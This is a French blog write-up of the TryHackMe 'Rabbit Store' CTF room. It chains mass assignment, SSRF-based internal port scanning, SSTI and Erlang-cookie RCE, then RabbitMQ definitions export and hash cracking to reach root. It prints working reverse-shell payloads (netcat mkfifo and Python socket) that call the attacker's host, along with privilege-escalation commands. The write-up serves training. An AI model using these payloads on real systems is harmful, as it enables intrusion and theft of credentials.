---
date: 2025-02-25T21:16:11-06:00
# description: ""
image: "/images/THM-RabbitStore/RabbitStore.png"
showTableOfContents: true
tags: ["TryHackMe"]
categories: ["Writeups"]
title: "THM: Rabbit Store"
type: "post"
---

* Platforme: TryHackMe
* Lien: [Rabbit Store](https://tryhackme.com/room/rabbitstore)
* Niveau: Moyen
* OS: Linux
---

Rabbit Store présente quelques services peu communs. Le défi commence par l'identification d'une vulnérabilité d'assignation de masse dans une API, qui est ensuite exploitée avec une vulnérabilité SSRF pour récupérer la documentation de l'API. L'un des endpoints découverts est vulnérable au SSTI, ce qui nous permet d'obtenir un accès initial au système cible. Grâce à l'énumération, nous découvrons un cookie Erlang, ce qui nous permet de pivoter vers un autre utilisateur. Ensuite, nous escaladons nos privilèges en créant un utilisateur admin dans RabbitMQ et en exportant un fichier contenant des informations sensibles, y compris le hachage du mot de passe de l'utilisateur root. En formatant correctement le hachage, nous récupérons finalement le mot de passe de l'utilisateur root et parvenons à compromettre complètement le système.

## Balayage

```
nmap -T4 -sC -sV -Pn -p- -oA nmap/Rabbit_Store {TARGET_IP}
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 21:15 CST
Warning: 10.10.117.80 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.117.80
Host is up (0.19s latency).
Not shown: 65521 closed tcp ports (conn-refused)
PORT      STATE    SERVICE      VERSION
22/tcp    open     ssh          OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA)
|_  256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519)

80/tcp    open     http         Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://cloudsite.thm/

3026/tcp  filtered agri-gateway

4369/tcp  open     epmd         Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
12606/tcp filtered unknown
14949/tcp filtered unknown
18309/tcp filtered unknown
25672/tcp open     unknown
25890/tcp filtered unknown
26284/tcp filtered unknown
35021/tcp filtered unknown
52841/tcp filtered unknown
59431/tcp filtered unknown
62532/tcp filtered unknown
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1250.63 seconds
```

Nmap découvre quatre ports ouverts:
- 22 avec SSH 
- 80 avec http, avec une redirection vers `cloudsite.thm`
- 4369 avec epmd
- 25672 (c'est le port de distribution Erlang, utilisé pour le clustering RabbitMQ)

> Le service `epmd` (Erlang Port Mapper Daemon) est utilisé par les applications Erlang pour se découvrir mutuellement sur un réseau.
> _Plus d'informations sur le service [ici](https://www.erlang.org/docs/26/man/epmd)._

## Enumération

Nous utilisons `nc -vz {TARGET_IP} 25672` pour vérifier le statut de `RabbitMQ`.

![RabbitMQ service test](/images/THM-RabbitStore/rabbitMQ_test.png)

La réponse semble indiquer que `RabbitMQ` est en cours d'exécution sur la cible. 

> RabbitMQ est un gestionnaire de messages open-source qui implémente le protocole AMQP (Advanced Message Queuing Protocol). Il est utilisé pour la communication asynchrone entre les applications, leur permettant d'envoyer et de recevoir des messages.
> _Pour en savoir plus, cliquez [ici](https://www.rabbitmq.com/)._

À l'adresse `http://cloudsite.thm`, nous trouvons le site web d'une entreprise fournissant des services cloud.

![clousite website](/images/THM-RabbitStore/website_RabbitStore.png)

Lorsque nous essayons de créer un compte, nous sommes redirigés vers `http://storage.cloudsite.thm/register.html`, nous devons mettre à jour le fichier `/etc/hosts` afin d'y accéder.

![clousite signup page](/images/THM-RabbitStore/signup_page.png)

Nous créons un compte et essayons de nous connecter, mais nous recevons un message nous indiquant que notre compte doit être activé à `http://storage.cloudsite.thm/dashboard/inactive`. 

![account activation](/images/THM-RabbitStore/account_activation.png)

Remarquant la mention `inactive` à la fin de l'url, nous la remplaçons par `active` et obtenons le message suivant: `Your subscription is inactive. You cannot use our services.`. Il semble s'agir d'un point de terminaison d'API.

![API inactive](/images/THM-RabbitStore/api_inactive_.png)

Nous nous connectons à nouveau et interceptons la requête cette fois-ci. Nous voyons une requête POST vers `/api/login`. Sa réponse contient un JWT (JSON Web Token), et nous pouvons voir le `inactive` à la fin (le statut actuel de notre compte/abonnement).

![POST request to /api/login](/images/THM-RabbitStore/JWT_login.png)

Essayons de trouver d'autres points de terminaison d'API avec ffuf.

```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://storage.cloudsite.thm/api/FUZZ -ic -fc 404
```

Nous en découvrons d'autres, mais nous ne pouvons pas accéder aux deux derniers:
* `/register`
* `/docs`
* `/uploads`

![directory brute forcing on /api](/images/THM-RabbitStore/api_ffuf.png)

![access denied to /api/docs](/images/THM-RabbitStore/api_docs.png)

![access denied to /api/uploads](/images/THM-RabbitStore/api_uploads.png)

### Vulnérabilité Mass Assignment

Nous utilisons [jwt.io](https://jwt.io/) pour analyser le jeton. Nous voyons en effet que notre abonnement est marqué comme `inactif` dans le payload décodé.

![decoded JWT](/images/THM-RabbitStore/decoded_JWT.png)

Nous enregistrons un compte et ajoutons manuellement `"subscription":"active"` à la requête POST vers `/api/register`.

![mass assignment vulnerability](/images/THM-RabbitStore/mass_assign.png)

Notre requête est acceptée!

![mass assignment vulnerability successful](/images/THM-RabbitStore/mass_assign1.png)

We login and now have access to `http://storage.cloudsite.thm/dashboard/active`, where we find a file upload feature.

> La vulnérabilité que nous avons exploitée est connue sous le nom de vulnérabilité du type `mass assignment` (affectation de masse). Elle se produit lorsqu'une API permet la modification de champs qui ne devraient pas être directement manipulés par les utilisateurs, tels que des attributs sensibles ou internes.

### Exploitation du SSRF

Nous pouvons uploader un fichier à partir de notre ordinateur ou depuis une URL.

![access to /dashboard/active](/images/THM-RabbitStore/dashboard_active.png)

![upload files from url option](/images/THM-RabbitStore/upload_url.png)

Une fonctionnalité acceptant une URL soumise par l'utilisateur peut potentiellement signifier une vulnérabilité SSRF, alors testons là.

Nous créons un fichier de test et démarrons un serveur python sur notre machine locale.

```
echo 'let_me_in' > SSRF_test.txt

python3 -m http.server
```

![SSRF vulnerability test](/images/THM-RabbitStore/SSRF_vuln_test.png)

Sur le site web, nous entrons l'url de notre serveur web.

```
http://{YOUR_IP}:{PORT}/{FILENAME}
```

![file submission via url](/images/THM-RabbitStore/url_sub.png)

La procédure fonctionne, nous recevons une demande sur notre serveur web et le fichier est téléchargé avec succès sur la cible.

![http 200 on web server](/images/THM-RabbitStore/ssrf_200.png)

![file successfully stored on the target](/images/THM-RabbitStore/upload.png)

Après avoir rafraîchi la page, nous pouvons le voir sous la rubrique `Uploaded Files` (Fichiers téléchargés).

![uploaded file list](/images/THM-RabbitStore/uploaded_files.png)

Lorsque nous cliquons sur le lien du fichier sous `Uploaded Files`, une requête GET est envoyée à `/api/uploads/xxxxx`. Cette requête est utilisée pour télécharger les fichiers.

![GET request to /api/uploads](/images/THM-RabbitStore/api_uploads_req.png)

Nous pouvons à présent accéder à `http://storage.cloudsite.thm/api/uploads`.

![successful access to /api/uploads](/images/THM-RabbitStore/api_uploads_access.png)

La fonction de téléversement via URL envoie une requête à `/api/store-url`.

![request to /api/store-url](/images/THM-RabbitStore/api_store_url.png)

Nous allons essayer d'accéder à `/api/docs` par le biais du SSRF.

![Attempt to access /api/docs via SSRF](/images/THM-RabbitStore/SSRF_api_docs_1.png)

La requête est réussie mais le fichier téléchargé ne contient qu'une erreur `404`.

![downloaded file contains 404 error](/images/THM-RabbitStore/404_file_dl.png)

#### Balayage des ports internes via SSRF

Essayons de trouver des ports internes ouverts sur la cible.

> La même méthode est utilisée dans [THM: Creative](https://scorpiosec.com/fr/posts/thm-creative/#balayage-des-ports-internes-via-ssrf).
> Tous ces paramètres proviennent de la requête POST vers `/api/store-url`.

```
ffuf -u "http://storage.cloudsite.thm/api/store-url" \
-X POST \
-H "Content-Type: application/json" \
-H "Cookie: jwt=YOUR_JWT_VALUE" \
-d '{"url":"http://127.0.0.1:FUZZ"}' \
-w <(seq 1 65535) \
-mc all \
-t 100 \
-fs 41
```

Nous découvrons quelques ports.

![Internal port scan via SSRF](/images/THM-RabbitStore/SSRF_internal_ports.png)

Nous allons essayer d'atteindre `/api/docs`.

```
http://127.0.0.1:3000/api/docs
```

![second attempt to access /api/docs](/images/THM-RabbitStore/api_docs_upload.png)

Cette fois, nous obtenons le bon fichier, détaillant tous les points de terminaison de l'API. Nous connaissions déjà la plupart d'entre eux, le nouveau est `/api/fetch_messeges_from_chatbot`.

![Successfully retrieve /api/docs](/images/THM-RabbitStore/api_docs_file.png)

### Exploitation du SSTI 

Le fichier nous indique que nous devons utiliser une requête POST pour y accéder. Commençons donc par capturer la requête vers `http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot`.

Comme attendu, nous obtenons `GET method not allowed`.

![GET request to /api/fetch_messeges_from_chatbot](/images/THM-RabbitStore/GET_chatbot.png)

Nous la transformons en requête POST et l'envoyons à nouveau. Nous obtenons alors une erreur 500.

![http 500 error to POST request](/images/THM-RabbitStore/internal_error_chatbot.png)

Puisque nous interagissons avec l'API, ajoutons `Content-Type : application/json` à notre requête et essayons d'envoyer quelques paramètres aléatoires.

![username parameter required](/images/THM-RabbitStore/custom_req_chatbot.png)

Il nous indique qu'un paramètre username (nom d'utilisateur) est nécessaire. Après l'avoir ajouté, on nous dit que le chatbot est en cours de développement. Nous remarquons que la réponse inclut le nom d'utilisateur que nous avons envoyé et que tout nom différent produit la même réponse.

Il y a probablement une sorte de modèle utilisé en arrière-plan qui ressemble à ceci: `Sorry, $username, our chatbot server is currently under development.` (Désolé, $username, notre serveur de chatbot est actuellement en cours de développement).

![successful POST request to /api/fetch_messeges_from_chatbot](/images/THM-RabbitStore/chatbot_response.png)

Nous allons tester une vulnérabilité SSTI (Server Side Template Injection). Sur [HackTricks](https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection#identify) nous trouvons de nombreux payloads.

Le payload est bel et bien exécuté!

![SSTI confirmed](/images/THM-RabbitStore/SSTI_confirmed.png)

## Accès initial (shell en tant que azrael)

Bien que le payload fonctionne, je me demande pourquoi c'est le cas :thinking:.

Parce que cette application utilise le framework Express et `{{7*7}}` est un payload pour `Jinja2 (Python)`.

![Rabbit Store tech stack](/images/THM-RabbitStore/rabbit_store_techstack.png)

Nous tentons d'obtenir un shell inversé avec le payload suivant:

```
{{ config.__class__.__init__.__globals__['os'].system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR_IP PORT_NUMBER >/tmp/f') }}
```

![SSTI for RCE](/images/THM-RabbitStore/SSTI_RCE.png)

Après avoir envoyé la requête, nous obtenons un shell sous le nom de `azrael` sur notre listener. Nous pouvons également améliorer le shell avec les commandes ci-dessous.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
stty rows 38 columns 116
```

![foothold and user flag](/images/THM-RabbitStore/user_flag.png)

### Shell en tant que rabbitmq

Linpeas trouve un fichier Erlang appelé `.erlang.cookie` dans `/var/lib/rabbitmq/`. Le fichier appartient à l'utilisateur `rabbitmq`.

![Erlang file found](/images/THM-RabbitStore/erlang_file.png)

Nous nous souvenons que notre scan nmap a trouvé les ports `4369` et `25672` ouverts.

Sur [cette page HackTricks](https://hacktricks.boitatech.com.br/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd#local-connection), nous apprenons quelques méthodes pour obtenir un RCE en utilisant le cookie Erlang. Cependant, nous devons modifier légèrement la commande, au lieu de `couchdb@localhost` nous utilisons `rabbit@forge` (forge est le nom de l'hôte cible).
```
HOME=/ erl -sname kscorpio -setcookie CCOKIE_FOUND


rpc:call('rabbit@forge', os, cmd, ["python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR_IP\", PORT_NUMBER));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"]).
```

![Erlang Cookie RCE](/images/THM-RabbitStore/erl_rce.png)

Sur notre listener, nous avons maintenant un shell sous le nom de `rabbitmq`.

![rabbitmq shell](/images/THM-RabbitStore/rabbitmq_shell.png)

Maintenant que nous sommes `rabbitmq`, nous pouvons utiliser `rabbitmqctl`. Nous essayons d'abord `list_users` mais il renvoie une erreur.

```
rabbitmqctl list_users
```

![failed rabbitmq list_users command](/images/THM-RabbitStore/list_users.png)

Nous corrigeons les permissions du fichier et exécutons à nouveau la commande.

```
chmod 400 /var/lib/rabbitmq/.erlang.cookie
```

![successful rabbitmq list_users command](/images/THM-RabbitStore/rabbitmq_list_users.png)

Nous obtenons le message:

```
The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.
```

> Le mot de passe de l'utilisateur root est la valeur SHA-256 du mot de passe de l'utilisateur root de RabbitMQ. N'essayez pas de craquer SHA-256.

## Escalade des privilèges (shell en tant que root)

[Cette page](https://www.rabbitmq.com/docs/definitions) nous apprends que RabbitMQ stocke les informations dans des `définitions`, ces fichiers peuvent être exportés sous forme de fichier JSON. Nous pouvons abuser de nos privilèges pour créer un nouvel utilisateur et réaliser cette opération.

```
rabbitmqctl add_user kscorpio kscorpio 
rabbitmqctl set_permissions -p / kscorpio ".*" ".*" ".*"
rabbitmqctl set_user_tags kscorpio administrator
rabbitmqadmin export rabbit.definitions.json -u kscorpio -p kscorpio
```

![rabbitmq export definitions](/images/THM-RabbitStore/rabbitmq_privesc.png)

À l'intérieur du fichier, nous trouvons le hachage du mot de passe root.

![root password hash in json file](/images/THM-RabbitStore/rabbitmq_pwd_hash.png)

Pour craquer un hash RabbitMQ avec un outil tel que hashcat, nous devons d'abord le formater. Sur [cette page Github](https://github.com/QKaiser/cottontail/issues/27), nous apprenons comment le faire. 

```
echo "RABBITMQ_HASH" | base64 -d | xxd -pr -c128 | perl -pe 's/^(.{8})(.*)/$2:$1/' > hash.txt


hashcat -m 1420 --hex-salt hash.txt /usr/share/wordlists/rockyou.txt
```

> Dans notre cas, nous n'avons pas besoin de la deuxième étape.

La documentation disponible [ici](https://www.rabbitmq.com/docs/passwords#hash-via-http-api) nous indique que les hashs utilisent un sel de `32 bit` (4 octets) et nous savons que : "le mot de passe de l'utilisateur root est la valeur SHA-256 du mot de passe de l'utilisateur root de RabbitMQ".

Le mot de passe est donc simplement constitué de tous les caractères moins le sel (notre hachage formaté sépare les deux pour nous). Nous l'utilisons et sommes en mesure de lire le drapeau root.

![root password](/images/THM-RabbitStore/root_pwd.png)

![access to the root account](/images/THM-RabbitStore/root_flag.png)

## Ressources complémentaires

Merci d'avoir pris le temps de lire cet article. Cette room est une excellente introduction à de nouvelles exploitations (du moins pour moi). Vous trouverez ci-dessous des ressources supplémentaires (et gratuites) pour vous exercer aux vulnérabilités présentées:

* Apprendre à exploiter les vulnérabilités mass assignment avec PortSwigger [ici](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability).
* En apprendre plus sur le [SSRF](https://portswigger.net/web-security/ssrf) et le [SSTI](https://portswigger.net/web-security/server-side-template-injection) avec PortSwigger.
* Les méthodes permettant d'obtenir un RCE en abusant du cookie Erlang sont disponibles [here](https://hacktricks.boitatech.com.br/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd#local-connection).


